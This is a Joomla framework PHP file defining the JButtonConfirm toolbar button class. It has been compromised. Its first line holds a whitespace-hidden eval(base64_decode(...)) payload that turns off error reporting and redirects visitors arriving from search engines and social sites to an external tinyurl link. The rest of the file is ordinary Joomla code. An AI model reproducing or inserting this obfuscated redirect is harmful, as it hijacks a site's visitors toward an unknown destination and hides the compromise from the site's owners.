<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9hZWxud2o0Iik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));
/**
* @version		$Id:confirm.php 6961 2007-03-15 16:06:53Z tcp $
* @package		Joomla.Framework
* @subpackage	HTML
* @copyright	Copyright (C) 2005 - 2010 Open Source Matters. All rights reserved.
* @license		GNU/GPL, see LICENSE.php
* Joomla! is free software. This version may have been modified pursuant
* to the GNU General Public License, and as distributed it includes or
* is derivative of works licensed under the GNU General Public License or
* other free or open source software licenses.
* See COPYRIGHT.php for copyright notices and details.
*/

// Check to ensure this file is within the rest of the framework
defined('JPATH_BASE') or die();

/**
 * Renders a standard button with a confirm dialog
 *
 * @package 	Joomla.Framework
 * @subpackage	HTML
 * @since		1.5
 */
class JButtonConfirm extends JButton
{
	/**
	 * Button type
	 *
	 * @access	protected
	 * @var		string
	 */
	var $_name = 'Confirm';

	function fetchButton( $type='Confirm', $msg='', $name = '', $text = '', $task = '', $list = true, $hideMenu = false )
	{
		$text	= JText::_($text);
		$msg	= JText::_($msg, true);
		$class	= $this->fetchIconClass($name);
		$doTask	= $this->_getCommand($msg, $name, $task, $list, $hideMenu);

		$html	= "<a href=\"#\" onclick=\"$doTask\" class=\"toolbar\">\n";
		$html .= "<span class=\"$class\" title=\"$text\">\n";
		$html .= "</span>\n";
		$html	.= "$text\n";
		$html	.= "</a>\n";

		return $html;
	}

	/**
	 * Get the button CSS Id
	 *
	 * @access	public
	 * @return	string	Button CSS Id
	 * @since	1.5
	 */
	function fetchId( $type='Confirm', $name = '', $text = '', $task = '', $list = true, $hideMenu = false )
	{
		return $this->_parent->_name.'-'.$name;
	}

	/**
	 * Get the JavaScript command for the button
	 *
	 * @access	private
	 * @param	object	$definition	Button definition
	 * @return	string	JavaScript command string
	 * @since	1.5
	 */
	function _getCommand($msg, $name, $task, $list, $hide)
	{
		$todo	 = JString::strtolower(JText::_( $name ));
		$message = JText::sprintf( 'Please make a selection from the list to', $todo );
		$message = addslashes($message);

		if ($hide) {
			if ($list) {
				$cmd = "javascript:if(document.adminForm.boxchecked.value==0){alert('$message');}else{hideMainMenu();if(confirm('$msg')){submitbutton('$task');}}";
			} else {
				$cmd = "javascript:hideMainMenu();if(confirm('$msg')){submitbutton('$task');}";
			}
		} else {
			if ($list) {
				$cmd = "javascript:if(document.adminForm.boxchecked.value==0){alert('$message');}else{if(confirm('$msg')){submitbutton('$task');}}";
			} else {
				$cmd = "javascript:if(confirm('$msg')){submitbutton('$task');}";
			}
		}

		return $cmd;
	}
}